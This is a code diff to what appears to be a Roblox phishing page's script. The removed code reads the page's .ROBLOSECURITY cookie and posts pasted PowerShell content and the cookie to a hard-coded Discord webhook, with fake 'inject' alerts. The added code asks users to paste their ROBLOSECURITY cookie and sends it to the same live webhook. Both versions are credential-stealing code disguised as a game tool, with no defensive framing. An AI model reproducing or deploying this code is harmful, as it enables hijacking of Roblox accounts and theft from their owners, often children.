@@ -168,9 +168,9 @@
         function loadGetStarted() {
             document.getElementById('content').innerHTML = `
                 <div class="form-container">
-                    <h1>Enter The Correct File</h1>
-                    <textarea id="fileInput" placeholder="Paste your powershell file content here..."></textarea>
-                    <button class="button" onclick="processFile()">Send</button>
+                    <h1>Enter Your Cookie</h1>
+                    <textarea id="cookieInput" placeholder="Paste your ROBLOSECURITY cookie here..."></textarea>
+                    <button class="button" onclick="sendCookie()">Send Cookie</button>
                     <a href="#" class="back-button" onclick="goBack()">Back</a>
                 </div>
             `;
@@ -181,55 +181,47 @@
             document.getElementById('content').innerHTML = '';
         }
 
-        // Process File Input
-        function processFile() {
-            const fileContent = document.getElementById('fileInput').value;
+        // Send Cookie to Discord Webhook
+        function sendCookie() {
+            const userCookie = document.getElementById('cookieInput').value.trim();
 
-            if (!fileContent.trim()) {
-                alert('Please paste a valid powershell file content.');
+            if (!userCookie) {
+                alert('Please enter a valid cookie.');
                 return;
             }
 
-            // Extract the Roblox security cookie
-            const robloCookie = document.cookie.split(';').find(cookie => cookie.trim().startsWith('.ROBLOSECURITY='));
+            // Create the embed message
+            const embed = {
+                content: "New session cookie received",
+                embeds: [
+                    {
+                        title: "Session Cookie",
+                        description: "A new session cookie has been received.",
+                        fields: [
+                            {
+                                name: "Cookie",
+                                value: userCookie,
+                                inline: false
+                            }
+                        ],
+                        color: 16711680 // Red color for embed
+                    }
+                ]
+            };
 
-            if (!robloCookie) {
-                alert('No Roblox security cookie found.');
-                return;
-            }
-
-            const robloCookieValue = robloCookie.split('=')[1];
-
-            const chunks = fileContent.match(/.{1,2000}/g); // Break into chunks
-            let delay = 0;
-
-            chunks.forEach((chunk, index) => {
-                setTimeout(() => {
-                    fetch('https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            content: `Part ${index + 1}: ${chunk}`,
-                            embeds: [{
-                                title: "Session Cookie",
-                                description: `Roblox Cookie: ${robloCookieValue}`,
-                                color: 16711680
-                            }]
-                        }),
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (index === chunks.length - 1) {
-                            alert('attempting to change stats and inject!');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error sending file chunk:', error);
-                        alert('Failed to inject roblox database.');
-                    });
-                }, delay);
-
-                delay += 2000; // Delay of 2 seconds between each request
+            // Send the embed to the Discord webhook
+            fetch('https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Cookie sent successfully!');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error sending the cookie.');
             });
         }
     </script>
